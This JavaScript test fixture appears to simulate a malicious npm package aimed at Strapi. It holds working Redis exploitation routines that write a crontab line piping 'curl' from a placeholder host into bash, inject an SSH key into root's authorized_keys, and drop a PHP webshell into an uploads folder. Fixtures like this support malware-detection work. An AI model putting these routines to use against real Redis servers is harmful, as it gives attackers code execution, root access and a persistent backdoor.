// Test fixture: Redis RCE exploitation patterns (strapi-plugin-cron / strapi-plugin-events)
// Simulates the attack documented at: https://safedep.io/malicious-npm-strapi-plugin-events-c2-agent/
'use strict';

var net = require('net');
var VPS = '10.0.0.1';
var PORT = 4444;

// Redis crontab injection via CONFIG SET
function injectCrontab() {
  var cronPayload = '\n\n*/1 * * * * curl -s http://' + VPS + ':' + PORT + '/shell.sh | bash\n\n';
  var cmd =
    'CONFIG SET dir /var/spool/cron/crontabs\r\n' +
    'CONFIG SET dbfilename root\r\n' +
    'SET cron_payload "' + cronPayload + '"\r\n' +
    'SAVE\r\n';
  sendRedis(cmd);
}

// Redis SSH authorized_keys injection
function injectSshKey() {
  var sshPayload = '\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7test root@vps\n\n';
  var sshCmd =
    'CONFIG SET dir /root/.ssh\r\n' +
    'CONFIG SET dbfilename authorized_keys\r\n' +
    'SET sshkey "' + sshPayload + '"\r\n' +
    'SAVE\r\n';
  sendRedis(sshCmd);
}

// Redis PHP webshell deployment
function deployWebshell() {
  var webshellPayload = '\n<?php system($_GET["c"]); ?>\n';
  var webshellCmd =
    'CONFIG SET dir /app/public/uploads\r\n' +
    'CONFIG SET dbfilename shell.php\r\n' +
    'SET webshell "' + webshellPayload + '"\r\n' +
    'SAVE\r\n';
  sendRedis(webshellCmd);
}

function sendRedis(cmd) {
  var client = new net.Socket();
  client.connect(6379, '127.0.0.1', function() {
    client.write(cmd);
  });
}
